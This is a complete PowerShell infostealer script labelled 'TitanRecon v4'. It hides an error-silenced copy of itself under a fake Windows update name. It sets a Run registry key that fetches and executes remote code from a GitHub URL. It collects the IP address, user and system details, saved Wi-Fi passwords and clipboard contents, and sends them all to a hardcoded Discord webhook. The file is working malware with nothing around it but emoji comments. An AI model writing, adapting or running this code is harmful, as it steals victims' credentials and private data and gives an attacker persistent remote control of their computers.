$ErrorActionPreference = "SilentlyContinue"
$webhook = "https://discord.com/api/webhooks/1356723527486804138/8uoObVFzZbql8opsETphWlbiXPSbYSZOgSW9mxfx_-A4olDcCGD3FQvslxUJ4UjvCE_L"

function Send($msg) {
    $json = @{content = $msg} | ConvertTo-Json -Depth 3
    Invoke-RestMethod -Uri $webhook -Method POST -Body $json -ContentType 'application/json'
}

# 🕶️ Stealth Copy
$target = "$env:APPDATA\MicrosoftWinUpdate.ps1"
if (!(Test-Path $target)) {
    Copy-Item -Path $PSCommandPath -Destination $target -Force
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdater" /d "powershell -w hidden -ep bypass -c iex(iwr -UseBasicParsing 'https://raw.githubusercontent.com/titanxrio/ps1/main/v4.ps1')" /f
}

# 🌍 IP
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip

# 🧠 User & System
$uname = $env:USERNAME
$pc = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$msg = "**[TitanRecon v4]**`n👤 $uname`n🖥️ $pc`n💿 $os`n🌐 IP: $ip"

# 📡 WLAN KEYS
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
$wifi = ""
foreach ($p in $profiles) {
    $pw = netsh wlan show profile name="$p" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
    $wifi += "`n$p → $pw"
}

# 📋 Clipboard
$clip = Get-Clipboard
if ($clip -eq "") { $clip = "[empty]" }

# ✉️ Full Send
$msg += "`n📡 **WLANs:**`n$wifi`n`n📋 **Clipboard:**`n$clip"
Send $msg
exit
